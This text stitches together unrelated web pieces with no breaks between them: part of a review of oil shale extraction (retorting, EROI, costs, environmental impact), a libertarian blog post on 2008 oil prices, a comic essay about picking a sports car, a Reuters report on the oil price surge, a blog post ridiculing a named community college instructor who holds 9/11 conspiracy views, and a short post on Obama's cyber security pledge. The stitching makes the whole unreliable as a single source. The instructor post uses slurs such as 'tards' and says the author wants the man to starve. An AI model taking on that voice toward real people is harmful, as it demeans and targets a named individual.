This method leaves the rock in place and injects a heat source that releases the oil from the kerogen .
The shale oil then flows to a well and is pumped to the surface .
The source of the heat is a technical issue still open to research and testing .
The only active pilot project in the U.S. , owned by Shell Oil , is using down hole electric resistance heaters , but optional technologies involve steam , microwaves , and fire .
Surface retorting :
This technology depends upon mined ore for a feedstock .
The ore can be either surface mined or mined underground .
The ore is brought to a surface facility , crushed and placed into a retort .
The shale oil is removed and the spent shale sent for disposal .
The shale oil is upgraded by the addition of hydrogen and then is refined conventionally to produce finished products .
Several different retort designs have been constructed and tested in the United States as a part of earlier development efforts .
Oil - Tech ( OT ) currently operates a small capacity , commercial retort in eastern Utah .
Their retort has a capacity to process 1 ton of oil shale per hour .
On average , one ton of oil shale will produce one barrel of shale oil .
The proprietary retort produces 30 degree API gravity oil with a pour point of 53 degrees Fahrenheit ( Ibid ) .
After approximately 6 hours of operation , there is sufficient spent shale to enable co-generation so that every 60 minutes approximately 41 tons of 2,500 degree Fahrenheit spent shale is produced – representing a large amount of embodied heat energy potentially useful for other tasks ( Ibid ) .
Also , an experimental “ hydroretort ” has been designed to operate under a hydrogen atmosphere at higher pressures which increases yields for some oil shale deposits by 200 % or more compared to the Fischer assay ( a standard laboratory method of determining the quantity of synthetic oil that a sample of crushed oil shale will produce ) ( Cleveland 2004 ) .
However , from an environmental point of view , in terms of topography alteration , water consumption , and greenhouse gas emissions , and despite the significant research and development work conducted 20 to 30 years ago , the industry has not yet reached a consensus on the best technology to use ( Committee on Resources 2005 ) .
Finally the Ratheon Company , which had invented microwave ovens , has put forth a plan to use microwaves in situ to cause the oil to flow from rocks in which they are found and into collecting basins .
It is not known at this time whether this will work in the field but early results are promising .
Resource base
Oil shale exists worldwide and occurs in nearly 100 major deposits in 27 countries ( US DOE ONPOSR 2004 ) , including in Australia , Brazil , Canada , China , Estonia , France , Russia , Scotland , South Africa , Spain , Sweden and the USA ( Table 1 ) .
However , despite periodic predictions that shale oil would soon be needed to replace diminishing crude oil supplies , shale oil production has actually dropped threefold since 1980 ( Figure 1 ; Burnham 2003 ) .
Table 1 . Reserves and distribution data on oil shales ( from Jiang Han and Cui 2007 )
Figure 1. Global oil shale production 1880 - 2000 . ( from Cleveland 2004 ) .
As can be seen in the case for U.S. , there is a large difference in the quality of the oil shale from place to place ( Figure 2 ) .
On the high end , commercial grade oil shale from the Green River Formation in Colorado assays at about 0.83 U.S. barrel of oil per short ton of rock ( Cleveland 2004 ) .
Most other oil shales give lower yields .
Figure 2 . Energy concentration , in barrels per acre thermal equivalents , for various Western fuels .
( from Committee on Resources 2005 )
In the U.S. , shale oil resources might be almost as large as the world ’s remaining conventional oil resources ( US DOE ONPOSR .
2004 ) .
However , although it is enormous , the main issue is how rapidly this resource can be brought online , especially given water , environmental , and infrastructure constraints .
One estimate is that U.S. domestic production of 2 million bbl / day could be possible by 2020 if a new generation of oil shale projects is realized by 2011 ( Ibid ) .
However , due to the existence of sensitive Federal lands in the region , such as national parks and forests , oil shale development may be heavily regulated for air emissions , which could constrain the size of the industry and its development ( Ibid ) .
A critical issue is the availability of sufficient water , as production and refining of the oil shale is extremely water - dependant .
In most areas and schemes a lot of water would have to be pumped uphill significant distances .
Another issue is the capital and the time required to construct facilities .
Investment decisions are typically made with 10 - year internal rate - of - return calculations , while the resource base supports a physical life of 40 years or more , and so large government subsidies may be needed if capital is to be raised quickly ( Ibid ) .
Currently ,
Shell hopes that first generation commercial start up will occur early in the next decade ; however , it will take many years beyond that for the product stream to reach steady state production and profitability ( Ibid ) .
Encouragement might be taken by the continued increase in the price of conventional oil , or discouragement from the fact that many huge investments have been made in the past with little oil to show for it , then or now .
EROI
Reported EROIs ( energy return on investments ) are generally in the range of 1.5:1 to 4:1 , with a few extreme values between 7:1 and 13:1 .
The main difference between oil sands and oil shale is that the oil sands are particles of sand , surrounded by a microscopic layer of water that is itself surrounded by heavy bitumen ( thick oil ) .
Separating the oil from the oil sands is much easier because of this water layer , since the oil is ‘‘ suspended ’ ’ in the water / sand layer and not directly stuck on or in the sand as is the case for oil shale .
This makes oil shale much more energy intensive to separate ( Ibid ) .
As such , shale oil production - whether through surface retorting or ICP - is more energy - intensive than conventional oil production or from tar sands , and even enhanced recovery from oil fields .
In fact , upstream energy consumption per unit of final fuel delivered is roughly 1.75 - 2.75 times that of conventional petroleum production ( Brandt 2007 ) .
Tar sands and oil shales seem to be in the same “ EROI ballpark ” .
Shell reports that in their ICP in situ process they consume 1 Btu for every 3
Btu’s of energy produced , corresponding to an EROI of 3:1 ( Ibid ) .
However , if the energy input is electricity and the output oil this would imply a quality - corrected EROI of close to unity .
On the other hand the utilization of natural gas produced during the ICP in - situ process doubles the energy efficiency to 6 Btu of energy produced for each Btu consumed corresponding to an EROI of 6:1 .
In addition shale oils are a special case , like tar sands , where a large proportion of the energy can be generated from the resource itself ( Ibid ) .
For the mining and retort process , the net energy return ( NER ) is very low if total energy inputs are counted ( NER < 1.5 ) ( Brandt 2006 , 2007 ) .
In a more recent study , Brandt concludes that the EROI for shale oil production using an ATP retort ( a method reported to have the highest conversion efficiency – 88 % ) is somewhere between 1.9 and 2.5 ( 2007 ) .
However , based on a study in Kentucky USA , if some of the measurable environmental costs associated with shale oil production are included , the EROI drops another 3 - 9 % ( Lind and Mitsch 1981 ) .
Furthermore , Cleveland concludes that the EROI for shale oil ranges above and below the break even point , depending on assumptions regarding location , resource quality , and technology characterization ( 2005 ) .
The use of microwaves , an old technology with new enthusiasts behind it , supposedly would generate higher EROIs but there have been studies of this yet in actually field conditions .

Socioeconomics
The useful oil that is obtained from retorting oil shale is synthetic crude which , like petroleum crude oil , requires refining to produce transportation fuels , heating oil , asphalt , and other petrochemicals .
It can also be burned directly as a low - grade fuel for use in electric power plants , or in the manufacture of cement ( Cleveland 2004 ) .
The economics of shale oil production are largely dependent on the methods used .
For example , cost per barrel of oil production / retorting is $ 8 USD when utilizing purchased electrical heat .
However , it decreases to $ 4 USD per barrel when using cogenerated heat .
This cost considers only retorting and does not consider mining .
Mining costs range from $ 6 - 22 USD per ton depending on the development stage of the mine and the type of equipment utilized .
Accordingly , OT ’s technology and processes can produce one barrel of shale oil at approximately $ 9.60 USD per barrel in the best case scenario and approximately $ 30 USD per barrel in the worst case scenario ( Ibid ) .
The calorific value of oil shale is very low - 8.8 MJ/kg if compared to other fuels ( 18–30 MJ / kg for coal , 19 MJ / kg for wood and 45 MJ / kg for light crude ) ( Talve and Riipulk 2001 ) .
The energy content of the final product however is similar to crude oil .
A problem that is obvious from the data is that shale oil is always waiting for oil to reach a given price level at which point it will become economic .
But as that price is reached and surpassed ( even over time by a factor of ten ) it remains uncompetitive because the cost of the extraction and processing has increased ( Hall et al. 1986 ) .
The problem here as with many other alternatives to what we do today , is that as the price of oil ( or fossil fuels more generally increases so does the price of everything made directly or indirectly with oil , which is essentially everything from steel to chemicals to water to labor .
In the U.S. , a large - scale commercial oil shale operation could have a significant impact on any nearby communities , the extent of which depends on the existing infrastructures and many other factors .
As such , in a case where shale oil development overlaps an area with increasing tourism and recreation opportunities and an expanding urban population , on top of this existing network of energy development and changing land uses it is likely to put much more pressure on an already fragile ecosystem and public temperament ( Committee on Resources 2005 ) .
An important issue is that most oil shales exist in areas very far from any infrastructure ( housing , water , schools and so on ) so that either very large daily transportation would be needed or whole new towns would need to be constructed .
At one time the prospects for oil shale in Australia seemed rather bright , and in the same issue ( March 1998 ) of Scientific American that published the important paper “ The end of cheap oil ” by Colin Campbell and Jean Laherrere they also published , almost as an antidote , the optimistic " Mining for oil " by Richard George , head of the Suncor Corporation .
George wanted to apply the Canadian tar sands technique , operational at that time , to oil shale .
He wrote “ a whole new oil shale industry could develop in Australia over the next decade .
So as production from conventional oil fields dwindles , oil shale and oil sand reserves may well become a major source of energy in the century to come .
According to Laherrere ( personal communication )
“ It is obvious that George combines in the same article thinking on ‘ oil sands ’ and ‘ oil shales . ’
Although both are commonly mined and need to be heated in giant drums , they have completely different origin and expulsion .
Bitumen ( oil sands ) are mainly degraded oil fields , as the end of the process before being completely eroded while oil shales are immature source - rock where oil has not yet been generated .
They require pyrolysis at over 500 °C to generate oil : there is no way that you can do it in a washing machine as Clark did it in 1920 for oil sands where you need only temperature well below 100°C .
The economics are also quite different .
It should be stated that there are very different birds !
And although Suncor spent $ 150 M to build the retorting plant in Australia they dropped the plant and wrote off their investment after failing to get a steady phase 1 production level of 4000 b/d .
Their Australian partners were bankrupted , and the project has been idle since 2004 !
Mining oil shale is recognized as a poor project now and the goal is in situ pyrolisis by heating the source material with electric heaters while freezing the material around the material being heated to prevent the polluted water to leave .
But Shell will not decide before 2012 if they will build a commercial pilot .
The USDOE is forecasting no oil shale production before 2030 . ”
Environment
At present , the environmental impacts of shale oil production seem large .
Oil shale is usually mined and so there are surface impacts ; however , the Shell ICP process may be able to reduce surface impacts by up to a factor of ten ( US DOE ONPOSR .
2004 ) .
Production is water intensive , which is an important limited resource in the dry U.S. regions with large oil shale deposits ( Committee on Resources 2005 ; Veil and Puder 2006 ) .
It is thought to require 1 or 2 barrels of water for every barrel of oil produced , where two - thirds of that water is dedicated to human resources , supporting people and infrastructure around production ( Committee on Resources 2005 ; US DOE ONPOSR .
2004 ) .
The retorting processes are energy - intensive and there are also combustion emissions in areas where the air is currently very clean ( Ibid ) .
The mining or in situ technologies also disturb the local water tables .
In the case of the in situ technology , the spent shale in place may contain toxins that need to be kept away from ground water ; however , Shell has developed a “ freeze wall ” ( maintained with in situ freezers running on electricity ) designed to isolate the process from local ground water ( Ibid ) .
In the case of surface retorting , the spent shale , processing water , and other byproducts must be disposed of in a safe manner .
The spent shale represents a particular problem because it takes up considerably more volume than the original rock , up to 30 % more ( US DOE ONPOSR . 2004 ) , and therefore affords a greater opportunity for infiltration by both precipitation and groundwater ( Veil and Pruder 2006 ) .
How to achieve disposal on a massive scale has not been defined ( Committee on Resources 2005 ) .
Furthermore , in the case of the Colorado River watershed , salinity is a major concern and eliminating it is one of the key goals of the Bureau of Reclamation , however , oil shale production would contribute to increased salinity ( Veil and Pruder 2006 ) .
Assuming fossil fuels are used to provide the energy input for shale oil production , the net greenhouse gas impact of developing oil shale resources can also be assumed to be substantially higher than the per-unit impact of conventional oil production .
Brandt found that the Shell ICP production process has GHG emissions that are similar to those from tar sands production in Alberta ; and that the mining and retorting process has emissions significantly in excess of synthetic fuels produced from coal and over 4 times the emissions from conventional oil ( Table 2 ) .
Table 2 ( from Brandt 2007 ) .
Click to Enlarge .
According to Brandt , if shale oil is produced , refined , and combusted at a rate equal to 10 % of 2005 U.S. gasoline consumption the full - fuel cycle emissions increase relative to conventional oil would be about 45 million tons of carbon to between 68 and 74 million tons of carbon ( 2007 ) .
Furthermore , it has been found that Estonian oil shale extraction causes surface subsidence when mining activities cease which leads to the formation of bogs , rendering agricultural areas unusable , and the death of forests ( Talve and Riipulk 2001 ) .
Other concerns include sulfur - gas emissions , high CO2 release per barrel of oil for modified in - situ processing , disturbance of topography , water consumption , and degradation of ground - water quality due to mobilization of organics and inorganics in the spent shale .
Such environmental concerns played a major role in the death of the U.S. federal oil shale research program in 1994 ( Burnham 2003 ) .
CONCLUSION
In conclusion , although shale oils represent a huge potential resource they have a history of “ always a bridesmaid and never a bride ” because as prices for oil increase the prices for extracting shale oil have increased as well .
This history represents the very real problems of generating a useful product from the resource .
The main problems include the distance of the shale from both the water and labor needed to extract it , the large environmental impact compared to conventional oil and the relatively low EROI .
In addition , with both shale and tar sands there is some disagreement whether the in situ should be charged as an energy opportunity cost , ( in the same sense that bagasse could be in sugar cane ethanol ) .
Ultimately , the question is , if conventional oil becomes very scarce whether a resource such as shale oil will be developed regardless of cost .

Since August 2007 , the price of oil has nearly doubled from under $ 70 per barrel to more than $ 135 per barrel .
This is of course a big problem for the world economy .
Not only will it cause massive redistribution of resources from consumers to producers , but by making transportation and production that uses petroleum products as an input , it will slow economic growth .
And many consumers , particularly in America , are shocked and angered by the high prices .
And since it is election year in America , this means the politicians all say they will try to fix the problem .
But as we will see , it is politicians which have caused the problems in the first place , and as no prominent politician except for Ron Paul recognize this and wants to abolish these policies , they instead create false scapegoats .
The most popular scapegoats right now are speculators .
Investing in commodities has in recent years been increasingly popular and certainly a very successful investment strategy , the case for which libertarian investment superstar Jim Rogers laid out in his book Hot Commodities that I reviewed on the Ludwig von Mises Institute web page .
The politicians and their collaborators now charge Jim Rogers and others who have followed his strategy of causing the commodity price boom they predicted and profited from .
Yet this accusation is based on a complete misunderstanding of how commodity markets function , whether intentional or not .
Considering how complex the functioning of these markets in fact is , it can not be ruled out that it is unintentional .
And even if it is n't , people need to learn this in order to be able to see through the deception .
Starting with the basics , commodity markets can be divided into spot markets and futures markets .
Spot markets are the markets for immediate delivery , futures markets are the markets for delivery at some future point in time , usually not more than a year or so in advance .
As futures contracts are constantly traded , it should be noted that someone who buys a commodity with a futures contracts need not necessarily be the one that buys it at the expiration date .
But this is not dissimilar to how someone who bought a commodity with a spot contract can sell the commodity to someone else .
And just as there is always both a buyer and a seller in a spot contract , there is always a buyer and a seller in a futures contract .
Usually though , the buyer is referred to as having a long position while the seller is referred to as having a short position , but that is basically just semantics .
People with long positions are in effect buyers while people with short position are in effect sellers .
What should further be realized is that first of all most commodity speculators invest in futures while what matters for the price of petroleum actually used in the economy is primarily the spot price .
Note further that commodity speculators can take both long position and short positions .
This implies that commodity speculators may not in fact be contributing to higher prices .
If speculators as a group have equally large long and short positions then they will have no effect on futures prices , and if they as a group have larger short positions than long positions then their speculations will in fact lower futures prices .
Moreover , even if speculators as a group have a net long position , the speculators that pushed up the futures price in the first place will , once the futures contract approaches expiration date , face two choices .
Choice number one is to sell the contract or sell the underlying commodity to some consumer once the contract expires .
Choice number two is to put the commodity in some physical inventory and keep it there .
If the speculators choose the first alternative , then this will push down the price back to the level where it would have been in the absence of the original purchase .
In this case , speculation will thus have no effect on the spot price .
If on the other hand the second alternative is chosen , then speculation will indeed contribute to higher prices , at least temporarily .
But while that is a possible theoretical scenario , that does not mean it is applicable to the current situation .
The fact is that there is no evidence of increased inventories .
Indeed , according the Energy Information Administration , U.S. crude oil inventories were 14 % lower in the week ending June 20 than a year ago .
Some have replied to this argument by saying stock building for speculative purposes need not be above ground , it could also come in the form of producers choosing not to pump oil from the ground .
But first of all , oil - producing governments is not what is typically meant by speculators .
And the issue being discussed was the role of professional speculators acting on the futures markets , not what the governments of Saudi Arabia or Kuwait choose to do , so this argument is basically a case of changing the subject .
And secondly , as it happens , no evidence exist that oil producers are choosing to reduce production for speculative purposes .
Spare capacity among oil producers is relatively low , especially if you exclude spare capacity caused by , for example terrorist attacks against oil facilities in Nigeria .
What then is the cause of high oil prices and what could be done about it ?
As I indicated in the aforementioned review , the boom is primarily driven by structural long - or medium - term factors .
Demand is growing rapidly because of the rise of China and fast growth in other emerging economies .
Meanwhile , while global oil production is actually growing , growth is inhibited in the short term both because of various political factors that stop drilling and because of the fact that even where such political obstacles does not exist , it takes several years to actually extract the oil .
Brazil has recently found vast new oil reserves , and no political obstacles exist there to prevent drilling , yet it will be several more years before that oil reaches the world market .
These political factors differ somewhat in their form , but none of them seems likely to go away anytime soon .
In Nigeria , as was previously stated , constant attacks against oil facilities are holding down production there , and these attacks looks unlikely to cease .
In countries like Venezuela , Mexico and Russia , hostility against foreign investments combined with governments and bureaucrats starving government run oil companies of competence and cash , means that potential oil production is held back .
And in the United States , opposition to drilling for environmentalist reasons , mainly by Democrats , prevents increases in oil production .
Another factor that in the short term has contributed to the sharp increase in the price of oil is the Fed 's inflationary monetary policies .
Because the price of oil is much more flexible than most other prices and it is immediately affected by , for example , exchange rate effects , the short - term effect of an inflationary monetary policy is much greater than the short - term effect on the more sticky prices of regular goods in the supermarkets .
That the oil price increased so much after the Fed started its aggressive interest rate cuts was not really a coincidence .
What then can be done about the high oil price ?
The long - term solution is to reduce or abolish taxation on oil production and to abolish all regulatory restrictions ( whether motivated for environmentalist reasons as in the U.S. or nationalist reasons as in Mexico ) on oil drilling .
Opponents of drilling often reply to this that it wo n't provide any short - term relief .
But while that is true , but there wo n't be any short - term relief without drilling either and the point of drilling is to provide long - term relief .
Moreover , their preferred solution of having the government invest in research to invent more so - called renewable sources of energy is likely to take even longer to provide relief ( if it ever provides relief ) .
To provide short - term relief , different solutions are needed .
This means , for example , that the U.S. government should start releasing the oil held in the so - called Strategic Petroleum Reserve , while the Fed should stop its inflationary policies .
Unfortunately , I do n't think any of these solutions are likely to be implemented anytime soon , which is one of the reasons why I am not as optimistic as Don Armentano about the possibility of a significant price decline in the near future .
However , while the oil price is unlikely to go down , we should always remember that it is governments and not speculators that are responsible for the all - too - high oil price we suffer from now .

The Best of Stefan M.I. Karlsson
There are a few things wrong with the world .
I do n't mean to sound pessimistic , but somebody has to ask , so that others can answer .
For this first topic , I would like to discuss Penis Extensions .
Do n't worry , I 'm not talking aboutextending a penis , more about the metaphorical sense .
Picture this scenario : I 'm walking down the street , and on the side there are parked 3 cars .
The first car is a Dodge Viper , the second car is a BMW z3 Roadster , and the third is a Toyota Yaris .
Now as I 'm walking by , a man cuts in front of me and is about to step onto the street .
I can tell he's not paying attention to traffic because of the intense conversation he 's having on the phone - the same reason he so rudely cut me off in my path .
Out of the corner of my eye I see a large shape rumbling down the street .
I turn to see a bus going just a little bit over the safety speed limit , which I 'm guessing is just a tiny bit too fast to stop before hitting the rude phone conversation man .
I quickly reach out and grab the man by the collar and pull him back as the bus roars past his face , missing his nose by just inches .
He hangs up the phone and turns to me .
He realizes I just saved his life , and after explaining that he's the owner of the 3 cars parked on that street , he says I can pick one of them to be mine , free of charge , as a token of his appreciation .
For a little background information , you 'd have to assume that this scenario is happening to a male , old enough to drive , with a driver 's license but no car .
Here comes the trouble .
Because the world is so set on stereotyping people by whatever means available , I can't just pick the coolest car of the three .
First of all , the BMW is a chick 's car .
I did n't label it that way , the world did .
I could get this car , and only let my girlfriend drive it , but it 's a convertible , so I could n't even ride along as a passenger .
The Dodge Viper is a fast car , the fastest of the three by far , and if it happened to be any other color than red , I could 've safely picked this car .
Because of some jealousy issues , word has it that people driving red sports cars are compensating for something .
You know , .
I still believe that it 's only people who can't afford sports cars that say that , but there 's absolutely no way around it .
Does this mean that I 'm stuck with the Yaris ?
Now a solution is I take the most expensive car ; sell it , and use the money to buy something else , maybe even another car without any penis issues , but it 's just ridiculous that I 'd have to do that .
If in this hypothetical situation I liked the Viper , and if it actually happens to look good in red , why the hell does n't the world allow this ?
Theoretically I should n't bother with what the world is thinking of me .
I should n't have to be so self conscious .
The more that I think about it , the less I care about what the world thinks .
" Hell , I 'll take the Viper " I tell the man , as his face seemingly brightens .
He pulls me a bit closer and whispers something in my ear about compensation for , but I laugh as he hands me the keys .
I get in and start the engine , letting the V10 , 8.4 liter , 600 horses roar a couple times .
" Not bad " I think to myself , " as far as penis extensions go " ....
I get in , start the engine , and drive towards the nearest car dealership thinking : " Sucker , now he 's stuck with a Yaris and a chick 's car " ....
I get in , but change my mind .
The man 's face turns sour when I tell him I 'd rather take the Yaris , because I 'm afraid of what the world will think about me .
After all those jokes in the boy 's locker room I can't afford a cool car ....
" I 'll have the BMW " I tell the man .
He looks at me with questioning eyes , wondering what my excuse will be .
I disappoint him , take the keys and drive home .
" Honey , I 'm home !
Guess what I brought you ! "
She comes outside and finds her new car .
" Oh , no !
Why did you get it in red ?!?
" ( Are there issues like this with women ? )
NEW YORK ( Reuters ) - A surge in the price of crude is threatening global growth for the first time in decades and spurring a desperate surge in interest in energy alternatives and new technology to keep conventional oil flowing .

How companies and governments navigate the treacherous energy landscape -- which some analysts liken to that of the 1970s and 1980s -- will shape the future of the global economy and potentially tilt the geopolitical balance , experts said .
“ What happens ten years down the road will be determined by the decisions made on energy today , ” said David Kirsch , analyst at PFC Energy in Washington .
“ Countries need to get serious about the underlying problem of demand for oil . ”
Oil prices have doubled in a year to around $ 130 a barrel as rapid increases in consumption in China and other developing countries strain supplies , and some analysts have said crude could top $ 200 a barrel by 2010 as the market remains tight .
While the boom has helped big oil producer countries , particularly Russia and parts of the Middle East , there are signs the major consumers -- the United States and parts of Europe and Asia -- are starting to crack under the strain .
High prices are hitting motorists at the pumps , hobbling energy - intensive industries like airlines and freight and feeding broader inflation including prices hikes for food that have led to protests and even in extreme cases riots around the world .
“ The oil price is unsustainable .
I think we ’ve reached the point now where we ’re starting to see significant responses from consumers , ” said Jim Hamilton , professor at the University of California in San Diego .
A SILVER LINING ?
The silver lining could be in how the world fights back .
Whereas in the 70s , governments looked mainly to conservation as a way to ease price woes , this era is looking to increased investment in alternative energies and better oil field technology to reach more resources .
“ Our time is very definitely coming , ” said Jeremy Leggett , chairman of British solar power company Solarcentury and former environmental campaigner .
“ The world is going to be beating a path to our doors ...
The oil crunch is coming soon . ”
In a sign of the shifting mentality , legendary Texas oil man T. Boone Pickens -- who made billions betting on higher oil prices -- has gone green with a plan to spend $ 10 billion to build the world ’s biggest wind farm .
Energy analyst and oil historian Daniel Yergin said earlier this month that record U.S. crude oil prices have reached a “ break point ” that will spur a shift away from an oil - centric transportation sector toward alternatives .
Alternative fuels have already made big inroads into energy markets , with ethanol making up some 7 percent of the U.S. gasoline pool thanks to government mandates and subsidies .
Americans have already tapped the brakes on their notoriously voracious road travel and are also starting buy more fuel efficient cars in a shift away from SUV’s .
But the move is n’t all green .
Rising prices and the scarcity of conventional supplies have triggered an inflow of cash into development of nonconventional petroleum sources -- like the Alberta oil sands , gas shale in Colorado and technology to turn coal into motorfuel -- that could be harmful to the environment .
Companies have already poured $ 100 billion into the Alberta oil sands and hope to triple production by 2015 .
“ The signals that ( record oil ) could send are a little scary , ” said Chris Walker , the North American director of The Climate Group , an international nonprofit organization .
In the meantime continued price hikes are darkening the clouds on the global economic horizon .
Energy experts said a continued rise could worsen an economic slowdown in Europe and the United States , already hit by a housing slump and credit crisis and potentially trigger a decisive recession .
It ’s also bad news for the developing Asian economies that fueled the spike , threatening to slow down their pace of growth .
“ We ’ll see growth slow globally , ” said Jay Bryson , global economist at Wachovia Bank .
“ But the big losers are the oil importers of the world , including ( South ) Korea , Japan , China and a lot of other Asian economies in general . ”
China has enjoyed double - digit economic growth despite a surge in the cost of oil and commodity inputs , but the expansion could slow if prices climb even higher , especially if Beijing rolls back fuel subsidies that shield consumers .
Already this month , Indonesia , Taiwan , Sri Lanka and Bangladesh have either raised regulated fuel prices or pledged that they will , forced into unpopular action by the unsustainable cost of subsidies .
Russia and the big oil exporters of the Middle East have the most to gain , analysts said .
“ Obviously , the winners in this game are those who export oil , ” said George Friedman , founder of intelligence group Stratfor .
“ The victory is not only economic but political as well .
The ability to control where exports go and where they do n’t go transforms into political power . ”
MCC's Blair Gadsby , developer of the 9/11 diet plan .
Need more evidence that community college courses are too often taught by tards ?
Look no further than Mesa Community College instructor Blair Gadsby , MA , who apparently teaches a religious studies course at MCC ( they have his title listed as " Substitute - Day Inst " ) , and is a full blown 9/11 wack - job in his copious free time .
So much so that he reportedly plans a hunger strike at the Phoenix offices of Senator John McCain this Memorial Day to protest McCain 's forward to the 2006 tome Debunking 9/11 Myths : Why Conspiracy Theories Can't Stand Up to the Facts .
According to a recent press release , Gadsby wants two hours with McCain to convince him of the error of his ways .
Not that Gadsby has any evidence that 9/11 was an inside job .
None of the " troofers " do .
They just believe 9/11 was inside job .
You know , kind of like how the Flat Earthers believe our globe is really a pancake , or how UFO - ologists are convinced the government has those alien bodies on ice out at Area 51 .
Gadsby joins such renowned 9/11 nutbar " profs " as Kevin Barrett , who once wrote in an e-mail that , " I would still have to characterize the Holocaust as it is taught in the US as a hideously destructive myth , " as well as moonbatty philosophy don James " Uncle " Fetzer , and theology proctor David Ray Griffin , who alleges the calls from Flight 93 passengers to family members on 9/11 were faked using super - sophisticated voice morphing technology .
In his statement on the Web site patriotsquestion911.com , Gadsby indicates that the collapse of World Trade Center 7 " sealed it for me , " even though the building " was not hit by an airplane . "
He 's right , of course .
WTC 7 was not hit by an airplane .
Rather , it was hit by falling debris from the North Tower , and its interior burned nonstop all day before finally going down .
But that 's a pretty boring explanation , bolstered though it is by reality .
A much more exciting thesis is that it was brought down in a controlled demolition , as part of a massive conspiracy by Dick Cheney , Karl Rove and the rest of the Bushies .
Proof , schmoof !
All you have to do is believe , baby .
I for one hope that Gadsby is successful in his hunger strike .
Nah , I do n't want him to get any time with McCain .
I want him to starve !
And as he does so , I 'd like to be there , noshing on some Chinese takeout .
Plus if Gadsby keels over from lack of sustenance , maybe his students will get a replacement religion prof who has a PhD and is not a complete fruitcake .
Hey , dare to dream , people .

Talk about a contrast .
A day after John McCain said that he is learning how to use a computer , Barack Obama was on the campus of Purdue University today saying that he would make cyber security the top priority that it should be in the 21st Century .
“ As President , I ’ll make cyber security the top priority that it should be in the 21st century .
I ’ll declare our cyber - infrastructure a strategic asset , and appoint a National Cyber Advisor who will report directly to me .
We ’ll coordinate efforts across the federal government , implement a truly national cyber - security policy , and tighten standards to secure information – from the networks that power the federal government , to the networks that you use in your personal lives , ” Obama said .
He talked about cyber security as a part of our national security , “ We need to prevent terrorists or spies from hacking into our national security networks .
We need to build the capacity to identify , isolate , and respond to any cyber-attack .
And we need to develop new standards for the cyber security that protects our most important infrastructure – from electrical grids to sewage systems ; from air traffic control to our markets . ”

My first thought is that Obama must have seen Live Free or Die Hard , because what he was talking about is the plot of the movie .
I do n’t know much about cyber security , except that organized cyber attacks against governments are growing , and that the United States is behind the curve on cyber security .
This is one of those issues that paint the contrast between Obama and McCain in the most dramatic light .
Do we really want a 72 year old man who ca n’t use a computer making decisions about how we will protect and secure information networks that he does n’t even understand ?
Obama may not be perfect , but at least he is up with the times .
Most likely if McCain were to win the election , he would ignore this issue , and that is a risk I do n’t think that we can afford to take .
